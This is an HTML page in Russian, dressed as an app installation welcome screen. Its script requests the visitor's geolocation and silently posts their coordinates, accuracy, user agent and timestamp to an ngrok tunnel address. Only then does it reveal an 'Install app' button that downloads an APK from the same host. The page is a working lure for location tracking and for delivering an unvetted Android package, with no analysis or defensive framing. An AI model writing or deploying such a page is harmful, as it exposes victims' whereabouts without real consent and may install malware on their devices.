<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Добро пожаловать</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    #status { margin-bottom: 15px; }
    #installBtn {
      display: none;
      padding: 12px 20px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>Добро пожаловать! Для установки дайте разрешение</h2>
  <p id="status">Ожидание разрешения...</p>
  <button id="installBtn">Установить приложение</button>

  <script>
    const status = document.getElementById('status');
    const installBtn = document.getElementById('installBtn');

    navigator.geolocation.getCurrentPosition(
      async position => {
        const geoData = {
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          accuracy: position.coords.accuracy,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };

        try {
          await fetch("https://c0e0-149-102-242-94.ngrok-free.app/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(geoData)
          });

          installBtn.style.display = "inline-block";
          status.textContent = "Спасибо! Теперь вы можете установить приложение.";
        } catch (err) {
          status.textContent = "Ошибка отправки данных.";
        }
      },
      err => {
        status.textContent = "Ошибка геолокации: " + err.message;
      }
    );

    installBtn.onclick = () => {
      window.location.href = "https://c0e0-149-102-242-94.ngrok-free.app/download/app.apk";
    };
  </script>
</body>
</html>
